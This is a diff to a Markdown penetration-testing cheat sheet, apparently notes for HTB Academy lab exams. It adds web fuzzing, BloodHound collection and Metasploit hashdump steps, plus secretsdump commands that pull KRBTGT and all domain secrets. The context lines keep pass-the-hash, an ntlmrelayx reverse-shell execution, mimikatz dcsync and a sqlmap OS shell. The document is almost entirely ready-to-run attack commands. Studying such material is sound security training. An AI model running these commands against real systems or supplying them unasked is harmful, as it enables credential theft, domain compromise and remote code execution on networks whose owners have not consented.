@@ -37,9 +37,9 @@ If hosts discovered:
 - If SSH → [Remote Management](#linux-remote-management-ssh)
 
 ### 1.3 Web Enumeration
-- Whatweb
-- FFUF
-- Gobuster
+- [Whatweb](#WhatWeb)
+- [FFUF]
+- [Gobuster]
 - [Attacking SQL](#attacking-sql)
 - [SQLMap](#sqlmap)
 ### 1.4 Credential Attacks
@@ -323,6 +323,7 @@ nmap 192.168.1.1 -oN scan.txt
 # Output in the three major formats at once
 nmap 192.168.1.1 -oA scan
 ```
+
 ## Footprinting Services
 ##### FTP
 ```
@@ -418,6 +419,51 @@ msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)
 # Enforce password-based authentication
 ssh <user>@<FQDN/IP> -o PreferredAuthentications=password
 ```
+## Web Enumeration
+
+#### WhatWeb (Technology Fingerprinting)
+```
+# Basic scan
+whatweb http://target.com
+
+# Aggressive scan
+whatweb -a 3 http://target.com
+
+# Scan multiple hosts
+whatweb -i hosts.txt
+```
+#### FUFF (Fast Web Fuzzer)
+```
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+# With file extensions
+ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.txt,.html
+
+# Virtual host fuzzing
+ffuf -u http://target.com -H "Host: FUZZ.target.com" -w wordlist.txt
+
+# Filter by status code
+ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,302
+
+# Filter by response size
+ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 4242
+```
+#### Gobuster (Directory & DNS Brute Force)
+```
+# Directory brute force
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+# With extensions
+gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html
+
+# DNS brute force
+gobuster dns -d target.com -w subdomains.txt
+
+# Vhost brute force
+gobuster vhost -u http://target.com -w wordlist.txt
+```
+
+
 ## Password Attacks
 
 ##### Password Mutations
@@ -537,6 +583,9 @@ crackmapexec smb 10.10.110.17 -u Administrator -p'Password123!' -x'whoami' --exe
 
 crackmapexec smb 10.10.110.17 -u administrator -p'Password123!' --sam
 
+crackmapexec smb DC01 -u user -p password -d INLANEFREIGHT.LOCAL
+#If the above command shows (Pwn3d!) you are part of Domain Admins.
+
 #PtH
 crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294
 
@@ -555,6 +604,7 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
 # Execute a PowerShell based reverse shell using impacket-ntlmrelayx.
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>
 ```
+
 ##### Attacking SQL
 ```
 # SQLEXPRESS
@@ -632,10 +682,14 @@ nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum-list.txt
 # Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.
 ./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
 
-#Inveih.exe
+# (Recommended) Force AD DNS to the DC if SRV lookups fail
+bloodhound-python -d DOMAIN.LOCAL -u USER -p 'PASS' -dc DC01 -ns DC_IP -c All
 
-#Metasploit
+# Basic collection
+bloodhound-python -d DOMAIN.LOCAL -u USER -p 'PASS' -dc DC01 -c All
 
+# Upload results to BloodHound CE
+# - Produces .json files (zip them if needed) → import via BHCE UI
 
 ```
 ##### LLMNR Poisoning
@@ -655,6 +709,22 @@ PS C:\htb> .\Inveigh.exe
 GET NTLMV2USERNAMES
 
 ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
+
+# using metasploit
+# SMB version detection
+use auxiliary/scanner/smb/smb_version
+
+# SMB login brute force
+use auxiliary/scanner/smb/smb_login
+
+# Enumerate domain users
+use auxiliary/scanner/smb/smb_enumusers
+
+# Dump SAM hashes (requires admin)
+use post/windows/gather/hashdump
+
+# Kerberos user enumeration
+use auxiliary/gather/kerberos_enumusers
 
 ```
 ##### Password Spraying and Password Policies
@@ -875,6 +945,17 @@ mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\admin
 # Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
 Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
 
+# Dump only KRBTGT (recommended for exam questions)
+secretsdump.py -just-dc-user krbtgt DOMAIN.LOCAL/user:password@DC_IP
+
+# Dump all domain secrets (noisy)
+secretsdump.py -just-dc DOMAIN.LOCAL/user:password@DC_IP
+
+# Notes:
+# - Requires replication rights (e.g., Domain Admin, or DS-Replication-Get-Changes* rights)
+# - Output format: user:RID:LM:NTLM:::
+# - Submit NTLM (2nd hash), LM is often aad3b435...
+
 ```
 ##### Miscellanous Configurations
 ```
@@ -989,9 +1070,10 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 #[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
 #[RoguePotato](https://github.com/antonioCoco/RoguePotato)
 
-
-
 ```
+
+
+
 
 
 ## Useful Resources
